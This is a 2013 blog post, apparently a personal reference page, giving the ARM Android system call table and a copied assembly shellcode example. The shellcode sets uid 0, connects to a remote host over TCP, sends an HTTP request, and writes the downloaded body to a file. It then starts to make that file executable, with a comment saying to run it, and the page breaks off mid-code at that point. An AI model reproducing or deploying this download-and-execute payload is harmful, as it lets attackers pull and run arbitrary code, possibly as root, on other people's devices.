<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <title>@xjump</title>


  <script type="text/javascript" src="/slideout/1.0.1/slideout.min.js"></script>

  <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">
  <script type="text/javascript" defer src="/katex/0.10.1/katex.min.js" ></script>
  <script type="text/javascript" defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>

  <script type="text/javascript" defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>




  <link rel="stylesheet" href="/site.css">

  <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >





</head>

<body>
  <div class="container">
    <div id="mobile-navbar" class="mobile-navbar">
      <div class="mobile-header-logo">
      <a href="/" class="logo">@xjump</a>
      </div>
      <div class="mobile-navbar-icon icon-out">
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>

    <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
      <ul class="mobile-menu-list">
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me">Home</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">Categories</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">Archive</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">RSS</a>
        </li>
      
        <li class="mobile-menu-item">
        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">About</a>
        </li>
      
      </ul>
    </nav>

    <header id="header">
      <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
      <nav class="menu">
        <ul>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me">Home </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">Categories </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">Archive </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">RSS </a></li>
        
    <li><a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">About </a></li>
        
        </ul>
      </nav>
    </header>

    <main>
      <div class="content" id="mobile-panel">




<article class="post">

<header class="post__header">
  <h1 class="post__title"><a href="https:&#x2F;&#x2F;xjump.me&#x2F;20130110-android-system-call-table-call-in-shellcode&#x2F;">Android shellcodez</a></h1>
  <div class="post__meta">
    <span class="post__time">2013-01-10</span>

  </div>
</header>

 <div class="post-content"><p>
    Write some note here.</p>
<p>
    System call table:</p>
<pre data-lang="c" style="background-color:#212121;color:#eeffff;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#f78c6c;">1</span><span> exit
</span><span style="color:#f78c6c;">2</span><span> fork
</span><span style="color:#f78c6c;">3</span><span> read
</span><span style="color:#f78c6c;">4</span><span> write
</span><span style="color:#f78c6c;">5</span><span> open
</span><span style="color:#f78c6c;">6</span><span> close
</span><span style="color:#f78c6c;">9</span><span> link
</span><span style="color:#f78c6c;">10</span><span> unlink
</span><span style="color:#f78c6c;">11</span><span> execve
</span><span style="color:#f78c6c;">12</span><span> chdir
</span><span style="color:#f78c6c;">14</span><span> mknod
</span><span style="color:#f78c6c;">15</span><span> chmod
</span><span style="color:#f78c6c;">19</span><span> lseek
</span><span style="color:#f78c6c;">20</span><span> getpid
</span><span style="color:#f78c6c;">21</span><span> mount
</span><span style="color:#f78c6c;">26</span><span> ptrace
</span><span style="color:#f78c6c;">29</span><span> pause
</span><span style="color:#f78c6c;">33</span><span> access
</span><span style="color:#f78c6c;">36</span><span> sync
</span><span style="color:#f78c6c;">38</span><span> rename
</span><span style="color:#f78c6c;">39</span><span> mkdir
</span><span style="color:#f78c6c;">40</span><span> rmdir
</span><span style="color:#f78c6c;">41</span><span> dup
</span><span style="color:#f78c6c;">42</span><span> pipe
</span><span style="color:#f78c6c;">43</span><span> times
</span><span style="color:#f78c6c;">45</span><span> brk
</span><span style="color:#f78c6c;">51</span><span> acct
</span><span style="color:#f78c6c;">52</span><span> umount2
</span><span style="color:#f78c6c;">54</span><span> ioctl
</span><span style="color:#f78c6c;">55</span><span> fcntl
</span><span style="color:#f78c6c;">57</span><span> setpgid
</span><span style="color:#f78c6c;">60</span><span> umask
</span><span style="color:#f78c6c;">61</span><span> chroot
</span><span style="color:#f78c6c;">63</span><span> dup2
</span><span style="color:#f78c6c;">64</span><span> getppid
</span><span style="color:#f78c6c;">66</span><span> setsid
</span><span style="color:#f78c6c;">67</span><span> sigaction
</span><span style="color:#f78c6c;">72</span><span> sigsuspend
</span><span style="color:#f78c6c;">73</span><span> sigpending
</span><span style="color:#f78c6c;">75</span><span> setrlimit
</span><span style="color:#f78c6c;">77</span><span> getrusage
</span><span style="color:#f78c6c;">78</span><span> gettimeofday
</span><span style="color:#f78c6c;">79</span><span> settimeofday
</span><span style="color:#f78c6c;">83</span><span> symlink
</span><span style="color:#f78c6c;">85</span><span> readlink
</span><span style="color:#f78c6c;">88</span><span> reboot
</span><span style="color:#f78c6c;">91</span><span> munmap
</span><span style="color:#f78c6c;">92</span><span> truncate
</span><span style="color:#f78c6c;">93</span><span> ftruncate
</span><span style="color:#f78c6c;">94</span><span> fchmod
</span><span style="color:#f78c6c;">96</span><span> getpriority
</span><span style="color:#f78c6c;">97</span><span> setpriority
</span><span style="color:#f78c6c;">103</span><span> syslog
</span><span style="color:#f78c6c;">104</span><span> setitimer
</span><span style="color:#f78c6c;">105</span><span> getitimer
</span><span style="color:#f78c6c;">114</span><span> wait4
</span><span style="color:#f78c6c;">116</span><span> sysinfo
</span><span style="color:#f78c6c;">118</span><span> fsync
</span><span style="color:#f78c6c;">120</span><span> clone
</span><span style="color:#f78c6c;">122</span><span> uname
</span><span style="color:#f78c6c;">125</span><span> mprotect
</span><span style="color:#f78c6c;">126</span><span> sigprocmask
</span><span style="color:#f78c6c;">128</span><span> init_module
</span><span style="color:#f78c6c;">129</span><span> delete_module
</span><span style="color:#f78c6c;">132</span><span> getpgid
</span><span style="color:#f78c6c;">133</span><span> fchdir
</span><span style="color:#f78c6c;">140</span><span> _llseek
</span><span style="color:#f78c6c;">142</span><span> _newselect
</span><span style="color:#f78c6c;">143</span><span> flock
</span><span style="color:#f78c6c;">144</span><span> msync
</span><span style="color:#f78c6c;">145</span><span> readv
</span><span style="color:#f78c6c;">146</span><span> writev
</span><span style="color:#f78c6c;">148</span><span> fdatasync
</span><span style="color:#f78c6c;">150</span><span> mlock
</span><span style="color:#f78c6c;">151</span><span> munlock
</span><span style="color:#f78c6c;">154</span><span> sched_setparam
</span><span style="color:#f78c6c;">155</span><span> sched_getparam
</span><span style="color:#f78c6c;">156</span><span> sched_setscheduler
</span><span style="color:#f78c6c;">157</span><span> sched_getscheduler
</span><span style="color:#f78c6c;">158</span><span> sched_yield
</span><span style="color:#f78c6c;">159</span><span> sched_get_priority_max
</span><span style="color:#f78c6c;">160</span><span> sched_get_priority_min
</span><span style="color:#f78c6c;">161</span><span> sched_rr_get_interval
</span><span style="color:#f78c6c;">162</span><span> nanosleep
</span><span style="color:#f78c6c;">163</span><span> mremap
</span><span style="color:#f78c6c;">168</span><span> poll
</span><span style="color:#f78c6c;">172</span><span> prctl
</span><span style="color:#f78c6c;">174</span><span> rt_sigaction
</span><span style="color:#f78c6c;">175</span><span> rt_sigprocmask
</span><span style="color:#f78c6c;">177</span><span> rt_sigtimedwait
</span><span style="color:#f78c6c;">180</span><span> pread64
</span><span style="color:#f78c6c;">181</span><span> pwrite64
</span><span style="color:#f78c6c;">183</span><span> getcwd
</span><span style="color:#f78c6c;">184</span><span> capget
</span><span style="color:#f78c6c;">185</span><span> capset
</span><span style="color:#f78c6c;">186</span><span> sigaltstack
</span><span style="color:#f78c6c;">187</span><span> sendfile
</span><span style="color:#f78c6c;">190</span><span> vfork
</span><span style="color:#f78c6c;">191</span><span> ugetrlimit
</span><span style="color:#f78c6c;">192</span><span> mmap2
</span><span style="color:#f78c6c;">195</span><span> stat64
</span><span style="color:#f78c6c;">196</span><span> lstat64
</span><span style="color:#f78c6c;">197</span><span> fstat64
</span><span style="color:#f78c6c;">198</span><span> lchown32
</span><span style="color:#f78c6c;">199</span><span> getuid32
</span><span style="color:#f78c6c;">200</span><span> getgid32
</span><span style="color:#f78c6c;">201</span><span> geteuid32
</span><span style="color:#f78c6c;">202</span><span> getegid32
</span><span style="color:#f78c6c;">203</span><span> setreuid32
</span><span style="color:#f78c6c;">204</span><span> setregid32
</span><span style="color:#f78c6c;">205</span><span> getgroups32
</span><span style="color:#f78c6c;">206</span><span> setgroups32
</span><span style="color:#f78c6c;">207</span><span> fchown32
</span><span style="color:#f78c6c;">208</span><span> setresuid32
</span><span style="color:#f78c6c;">209</span><span> getresuid32
</span><span style="color:#f78c6c;">210</span><span> setresgid32
</span><span style="color:#f78c6c;">211</span><span> getresgid32
</span><span style="color:#f78c6c;">212</span><span> chown32
</span><span style="color:#f78c6c;">213</span><span> setuid32
</span><span style="color:#f78c6c;">214</span><span> setgid32
</span><span style="color:#f78c6c;">217</span><span> getdents64
</span><span style="color:#f78c6c;">219</span><span> mincore
</span><span style="color:#f78c6c;">220</span><span> madvise
</span><span style="color:#f78c6c;">221</span><span> fcntl64
</span><span style="color:#f78c6c;">224</span><span> gettid
</span><span style="color:#f78c6c;">240</span><span> futex
</span><span style="color:#f78c6c;">248</span><span> exit_group
</span><span style="color:#f78c6c;">250</span><span> epoll_create
</span><span style="color:#f78c6c;">251</span><span> epoll_ctl
</span><span style="color:#f78c6c;">252</span><span> epoll_wait
</span><span style="color:#f78c6c;">257</span><span> timer_create
</span><span style="color:#f78c6c;">258</span><span> timer_settime
</span><span style="color:#f78c6c;">259</span><span> timer_gettime
</span><span style="color:#f78c6c;">260</span><span> timer_getoverrun
</span><span style="color:#f78c6c;">261</span><span> timer_delete
</span><span style="color:#f78c6c;">262</span><span> clock_settime
</span><span style="color:#f78c6c;">263</span><span> clock_gettime
</span><span style="color:#f78c6c;">264</span><span> clock_getres
</span><span style="color:#f78c6c;">265</span><span> clock_nanosleep
</span><span style="color:#f78c6c;">266</span><span> statfs64
</span><span style="color:#f78c6c;">267</span><span> fstatfs64
</span><span style="color:#f78c6c;">269</span><span> utimes
</span><span style="color:#f78c6c;">280</span><span> waitid
</span><span style="color:#f78c6c;">281</span><span> socket
</span><span style="color:#f78c6c;">282</span><span> bind
</span><span style="color:#f78c6c;">283</span><span> connect
</span><span style="color:#f78c6c;">284</span><span> listen
</span><span style="color:#f78c6c;">285</span><span> accept
</span><span style="color:#f78c6c;">286</span><span> getsockname
</span><span style="color:#f78c6c;">287</span><span> getpeername
</span><span style="color:#f78c6c;">288</span><span> socketpair
</span><span style="color:#f78c6c;">290</span><span> sendto
</span><span style="color:#f78c6c;">292</span><span> recvfrom
</span><span style="color:#f78c6c;">293</span><span> shutdown
</span><span style="color:#f78c6c;">294</span><span> setsockopt
</span><span style="color:#f78c6c;">295</span><span> getsockopt
</span><span style="color:#f78c6c;">296</span><span> sendmsg
</span><span style="color:#f78c6c;">297</span><span> recvmsg
</span><span style="color:#f78c6c;">314</span><span> ioprio_set
</span><span style="color:#f78c6c;">315</span><span> ioprio_get
</span><span style="color:#f78c6c;">316</span><span> inotify_init
</span><span style="color:#f78c6c;">317</span><span> inotify_add_watch
</span><span style="color:#f78c6c;">318</span><span> inotify_rm_watch
</span><span style="color:#f78c6c;">322</span><span> openat
</span><span style="color:#f78c6c;">323</span><span> mkdirat
</span><span style="color:#f78c6c;">325</span><span> fchownat
</span><span style="color:#f78c6c;">327</span><span> fstatat64
</span><span style="color:#f78c6c;">328</span><span> unlinkat
</span><span style="color:#f78c6c;">329</span><span> renameat
</span><span style="color:#f78c6c;">333</span><span> fchmodat
</span><span style="color:#f78c6c;">356</span><span> eventfd2
</span><span style="color:#f78c6c;">359</span><span> pipe2
</span><span style="color:#f78c6c;">983042</span><span> ARM_cacheflush
</span><span style="color:#f78c6c;">983045</span><span> ARM_set_tls
</span></code></pre>
<p>
    the Linux system call table api reference:</p>
<p>
    <a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a></p>
<p>
    Write your shellcode on Android, ARM. Have a notice on howto pass the arguments, perform the call and get the result.</p>
<p>
    <a href="http://bbs.pediy.com/showthread.php?t=155774">http://bbs.pediy.com/showthread.php?t=155774</a></p>
<p>
    An Example copy from their:</p>
<pre data-lang="asm" style="background-color:#212121;color:#eeffff;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#82aaff;">.globl _start
</span><span style="color:#82aaff;">.align </span><span style="color:#f78c6c;">2
</span><span style="color:#82aaff;">_start:
</span><span style="color:#82aaff;">.code </span><span style="color:#f78c6c;">32
</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">thumb </span><span>+ </span><span style="color:#f78c6c;">1
</span><span style="color:#82aaff;">  </span><span style="color:#f78c6c;">bx </span><span style="color:#82aaff;">r0
</span><span style="color:#82aaff;">thumb:
</span><span style="color:#82aaff;">.code </span><span style="color:#f78c6c;">16
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">213
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@setuid32(</span><span style="color:#f78c6c;">0</span><span style="color:#82aaff;">)
</span><span style="color:#82aaff;">  @创建文件
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x1C
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4 </span><span style="color:#82aaff;">@S_IRWXU
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x24
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1 </span><span style="color:#82aaff;">@O_CREAT|O_WRONLY|O_TRUNC
</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">name
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">5
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">fd = open(name</span><span>, </span><span style="color:#82aaff;">O_CREAT|O_WRONLY|O_TRUNC</span><span>, </span><span style="color:#82aaff;">S_IRWXU)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r4</span><span>, </span><span style="color:#82aaff;">r0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">6 </span><span style="color:#82aaff;">@IPPROTO_TCP
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1 </span><span style="color:#82aaff;">@SOCK_STREAM
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">2 </span><span style="color:#82aaff;">@AF_INET
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">250
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">31
</span><span style="color:#82aaff;">  @建立连接
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">sock = socket(AF_INET</span><span>, </span><span style="color:#82aaff;">SOCK_STREAM</span><span>, </span><span style="color:#82aaff;">IPPROTO_TCP)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r5</span><span>, </span><span style="color:#82aaff;">r0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">16
</span><span style="color:#82aaff;">  adr r1</span><span>, </span><span style="color:#82aaff;">addr
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">250
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">33
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@connect(sock</span><span>, </span><span style="color:#82aaff;">addr</span><span>, </span><span style="color:#f78c6c;">16</span><span style="color:#82aaff;">)
</span><span style="color:#82aaff;">  @计算http头长度
</span><span style="color:#82aaff;">  adr r2</span><span>, </span><span style="color:#82aaff;">head
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r2
</span><span style="color:#82aaff;">  b L1
</span><span style="color:#82aaff;">L0:
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1
</span><span style="color:#82aaff;">L1:
</span><span style="color:#82aaff;">  ldrb r0</span><span>, [</span><span style="color:#82aaff;">r2</span><span>]
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  bne L0
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r1
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@write(sock</span><span>, </span><span style="color:#82aaff;">head</span><span>, </span><span style="color:#82aaff;">strlen(head))
</span><span style="color:#82aaff;">  @跳过http头
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  adr r6</span><span>, </span><span style="color:#82aaff;">nrnr
</span><span style="color:#82aaff;">  ldr r6</span><span>, [</span><span style="color:#82aaff;">r6</span><span>]
</span><span style="color:#82aaff;">L2:
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">3
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r3}
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">len = read(sock</span><span>, </span><span style="color:#82aaff;">buf</span><span>, </span><span style="color:#f78c6c;">252</span><span style="color:#82aaff;">)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">pop </span><span style="color:#82aaff;">{r3}
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  ble L7
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">L3:
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">8
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r2
</span><span style="color:#82aaff;">  ldrb r1</span><span>, [</span><span style="color:#82aaff;">r1</span><span>]
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r1
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r3</span><span>, </span><span style="color:#82aaff;">r6
</span><span style="color:#82aaff;">  beq L4
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r0
</span><span style="color:#82aaff;">  bne L3
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  b L2
</span><span style="color:#82aaff;">L4:
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r2
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r2
</span><span style="color:#82aaff;">  b L6
</span><span style="color:#82aaff;">  @写入文件
</span><span style="color:#82aaff;">L5:
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">3
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">len = read(sock</span><span>, </span><span style="color:#82aaff;">buf</span><span>, </span><span style="color:#f78c6c;">252</span><span style="color:#82aaff;">)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
</span><span style="color:#82aaff;">  ble L7
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r0  
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#f78c6c;">sp
</span><span style="color:#82aaff;">L6:  
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r4
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@write(fd</span><span>, </span><span style="color:#82aaff;">buf</span><span>, </span><span style="color:#82aaff;">len)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  b L5
</span><span style="color:#82aaff;">L7:
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#f78c6c;">sp</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">6 
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@close(sock)
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r4
</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@close(fd)
</span><span style="color:#82aaff;">  @执行文件
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x1C
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4 </span><span style="color:#82aaff;">@S_IRUSR|S_IWUSR|S_IXUSR
</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">name
</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">15
